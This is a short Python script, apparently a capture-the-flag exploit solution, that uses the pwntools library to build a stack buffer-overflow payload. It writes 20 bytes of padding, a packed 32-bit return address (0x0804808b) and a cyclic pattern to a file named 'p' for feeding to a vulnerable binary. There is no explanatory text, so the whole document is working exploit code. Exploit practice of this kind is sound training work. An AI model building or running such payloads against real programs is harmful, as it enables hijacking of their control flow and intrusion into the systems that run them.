from pwn import *

def main():
    payload = b'a' * 20
    payload += p32(0x0804808b)
    payload += cyclic(100)

    with open("p", "wb") as f:
        f.write(payload)

if __name__ == "__main__":
    main()
        